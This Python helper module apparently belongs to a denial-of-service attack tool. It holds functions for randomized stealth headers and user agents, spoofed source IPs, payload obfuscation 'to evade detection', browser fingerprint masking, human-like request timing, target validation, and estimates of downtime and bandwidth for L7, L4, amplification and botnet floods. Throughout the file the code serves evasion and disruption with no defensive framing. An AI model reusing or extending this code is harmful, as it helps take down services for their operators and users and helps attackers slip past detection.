import time
import random
import json
import os
import hashlib
import base64
from typing import Dict, Any, List, Tuple
from datetime import datetime
import string

def log_attack_metrics(total_sent: int, successful: int, failed: int, bypassed_challenges: int, duration: float):
    """Logs the final attack statistics."""
    print("--- Attack Summary ---")
    print(f"Total Requests Sent: {total_sent}")
    print(f"Successful Requests: {successful}")
    print(f"Failed Requests: {failed}")
    print(f"Challenge Bypasses: {bypassed_challenges}")
    print(f"Attack Duration: {duration:.2f} seconds")
    if duration > 0:
        print(f"Average RPS: {total_sent / duration:.2f}")
    print("----------------------")

def generate_random_string(length: int) -> str:
    """Generates a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_user_agent() -> str:
    """Generate a realistic browser user agent."""
    browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{}.0) Gecko/20100101 Firefox/{}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{}_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{}.0.0.0",
    ]

    version1 = random.randint(90, 120)
    version2 = random.randint(90, 120)
    mac_version = random.randint(14, 16)

    user_agent = random.choice(browsers)
    return user_agent.format(version1, version2, mac_version, version1)

def generate_random_http_headers() -> Dict[str, str]:
    """Generate randomized HTTP headers for stealth."""
    headers = {
        "User-Agent": generate_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    # Randomize some headers occasionally
    if random.random() > 0.7:
        headers["Cache-Control"] = "max-age=0"

    if random.random() > 0.8:
        headers["Sec-Fetch-Dest"] = "document"
        headers["Sec-Fetch-Mode"] = "navigate"
        headers["Sec-Fetch-Site"] = "none"

    return headers

def generate_random_ip_spoof() -> str:
    """Generate a random IP for spoofing."""
    # Use realistic IP ranges for stealth
    ip_ranges = [
        "192.168.1.{}",
        "10.0.0.{}",
        "172.16.0.{}",
        "203.0.113.{}",
        "198.51.100.{}",
        "100.64.0.{}"
    ]

    ip_range = random.choice(ip_ranges)
    return ip_range.format(random.randint(1, 255))

def calculate_attack_efficiency(sent: int, successful: int, duration: float) -> float:
    """Calculate attack efficiency as a percentage."""
    if sent == 0:
        return 0.0

    success_rate = successful / sent
    time_efficiency = min(duration / 300, 1.0)  # Normalize to 5 minutes

    return (success_rate * 0.7 + time_efficiency * 0.3) * 100

def generate_attack_id() -> str:
    """Generate a unique attack identifier."""
    timestamp = int(time.time())
    random_suffix = generate_random_string(8)
    return f"atk_{timestamp}_{random_suffix}"

def obfuscate_payload(payload: str) -> str:
    """Obfuscate attack payload to evade detection."""
    # Simple character substitution for demo
    obfuscation_map = {
        'a': '@',
        'e': '3',
        'i': '1',
        'o': '0',
        's': '$',
        't': '7',
        'l': '1',
        'g': '9'
    }

    obfuscated = ""
    for char in payload:
        if char.lower() in obfuscation_map and random.random() > 0.7:
            obfuscated += obfuscation_map[char.lower()]
        else:
            obfuscated += char

    return obfuscated

def calculate_optimal_thread_count(target_performance: float = 1.0) -> int:
    """Calculate optimal thread count based on system performance."""
    import multiprocessing

    # Get system info
    cpu_count = multiprocessing.cpu_count()
    memory_gb = 8  # Default assumption

    try:
        import psutil
        memory_gb = psutil.virtual_memory().total / (1024**3)
    except:
        pass

    # Base calculation
    base_threads = min(cpu_count * 2, 100)

    # Adjust for memory
    if memory_gb < 4:
        base_threads = min(base_threads, 20)
    elif memory_gb > 16:
        base_threads = min(base_threads * 1.5, 200)

    # Adjust for target performance multiplier
    optimal_threads = int(base_threads * target_performance)

    return max(1, min(optimal_threads, 500))

def generate_fingerprint_mask() -> Dict[str, Any]:
    """Generate a browser fingerprint mask for stealth."""
    return {
        "user_agent": generate_random_user_agent(),
        "screen_resolution": f"{random.randint(1024, 2560)}x{random.randint(768, 1440)}",
        "color_depth": random.choice([16, 24, 32]),
        "timezone": random.choice([-8, -7, -6, -5, -4, 0, 1, 2, 8]),
        "language": random.choice(["en-US", "en-GB", "es-ES", "fr-FR", "de-DE"]),
        "platform": random.choice(["Win32", "MacIntel", "Linux x86_64"]),
        "cookie_enabled": random.choice([True, False]),
        "do_not_track": random.choice([None, "1", "unspecified"]),
        "webgl_vendor": random.choice([
            "Google Inc. (Intel)",
            "Google Inc. (NVIDIA)",
            "Google Inc. (AMD)",
            "Intel Inc.",
            "NVIDIA Corporation",
            "ATI Technologies Inc."
        ]),
        "webgl_renderer": random.choice([
            "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)",
            "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0, D3D11)",
            "ANGLE (AMD, AMD Radeon RX 580 Series Direct3D11 vs_5_0 ps_5_0, D3D11)",
        ])
    }

def calculate_packet_timing(base_interval: float, stealth_mode: bool = False) -> float:
    """Calculate packet timing with optional randomization."""
    if not stealth_mode:
        return base_interval

    # Add human-like randomness to timing
    base_delay = base_interval

    # Random variation (±30%)
    variation = random.uniform(0.7, 1.3)
    delay = base_delay * variation

    # Occasional longer pauses (simulating human behavior)
    if random.random() < 0.05:  # 5% chance
        delay *= random.uniform(3, 10)

    return delay

def validate_target(target: str) -> Tuple[bool, str]:
    """Validate target format and reachability."""
    import socket

    try:
        # Handle URLs
        if target.startswith(('http://', 'https://')):
            # Extract hostname for basic validation
            hostname = target.split('://')[1].split('/')[0]
            if ':' in hostname:
                hostname = hostname.split(':')[0]
        else:
            hostname = target

        # Basic hostname validation
        if not hostname or len(hostname) > 253:
            return False, "Invalid hostname length"

        # Check for basic IP format
        try:
            socket.inet_aton(hostname)
            return True, "Valid IP address"
        except socket.error:
            # Check for domain format
            if hostname.count('.') >= 1 and all(part for part in hostname.split('.')):
                return True, "Valid hostname"

        return False, "Invalid target format"

    except Exception as e:
        return False, f"Validation error: {e}"

def generate_attack_report(attack_id: str, args, metrics: Dict[str, Any], output_dir: str) -> str:
    """Generate comprehensive attack report."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(output_dir, f"attack_report_{attack_id}_{timestamp}.json")

    try:
        report_data = {
            'attack_id': attack_id,
            'timestamp': datetime.now().isoformat(),
            'attack_parameters': vars(args) if hasattr(args, '__dict__') else args,
            'attack_metrics': metrics,
            'summary': {
                'attack_type': getattr(args, 'attack_type', 'unknown') if hasattr(args, '__dict__') else 'unknown',
                'target': getattr(args, 'target', 'unknown') if hasattr(args, '__dict__') else 'unknown',
                'duration': metrics.get('duration', 0),
                'success_rate': 'N/A',  # Would need to be calculated based on attack type
                'total_traffic': metrics.get('bytes_sent', 0) + metrics.get('bytes_amplified', 0)
            }
        }

        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)

        return report_file

    except Exception as e:
        print(f"❌ Error generating attack report: {e}")
        return None

def calculate_resource_usage() -> Dict[str, float]:
    """Calculate current system resource usage."""
    try:
        import psutil

        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')

        return {
            'cpu_percent': cpu_percent,
            'memory_percent': memory.percent,
            'disk_percent': disk.percent,
            'memory_used_gb': memory.used / (1024**3),
            'disk_used_gb': disk.used / (1024**3)
        }
    except ImportError:
        return {
            'cpu_percent': 0,
            'memory_percent': 0,
            'disk_percent': 0,
            'memory_used_gb': 0,
            'disk_used_gb': 0
        }
    except Exception as e:
        return {'error': str(e)}

def generate_stealth_headers() -> Dict[str, str]:
    """Generate headers that mimic legitimate browser traffic."""
    base_headers = generate_random_http_headers()

    # Add stealth-specific headers
    stealth_headers = {
        "Sec-CH-UA": '"Google Chrome";v="119", "Chromium";v="119", "Not-A.Brand";v="24"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }

    base_headers.update(stealth_headers)

    # Randomize referer occasionally
    if random.random() > 0.5:
        referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://search.yahoo.com/"
        ]
        base_headers["Referer"] = random.choice(referers)

    return base_headers

def create_attack_signature(target: str, attack_type: str) -> str:
    """Create a unique signature for attack tracking."""
    signature_data = f"{target}:{attack_type}:{int(time.time())}"
    return hashlib.sha256(signature_data.encode()).hexdigest()[:16]

def estimate_attack_impact(target: str, attack_type: str, intensity: str) -> Dict[str, Any]:
    """Estimate the potential impact of an attack."""
    impact_scores = {
        "l7": {"low": 0.3, "medium": 0.6, "high": 0.8, "extreme": 0.9},
        "l4": {"low": 0.4, "medium": 0.7, "high": 0.9, "extreme": 0.95},
        "amp": {"low": 0.2, "medium": 0.5, "high": 0.8, "extreme": 0.95},
        "botnet": {"low": 0.5, "medium": 0.8, "high": 0.95, "extreme": 0.99},
        "multi": {"low": 0.6, "medium": 0.9, "high": 0.98, "extreme": 0.99}
    }

    base_impact = impact_scores.get(attack_type, {}).get(intensity, 0.5)

    # Adjust based on target type
    if target.startswith(('http://', 'https://')):
        # Web target - L7 and multi-vector more effective
        if attack_type in ["l7", "multi"]:
            base_impact *= 1.2
        elif attack_type == "l4":
            base_impact *= 0.8
    else:
        # IP target - L4 and amplification more effective
        if attack_type in ["l4", "amp"]:
            base_impact *= 1.3
        elif attack_type == "l7":
            base_impact *= 0.7

    # Cap at 1.0
    base_impact = min(base_impact, 1.0)

    return {
        'estimated_impact': base_impact,
        'estimated_downtime_minutes': int(base_impact * 60),
        'estimated_bandwidth_consumption_gbps': base_impact * 10,
        'estimated_success_probability': base_impact * 0.8 + 0.1
    }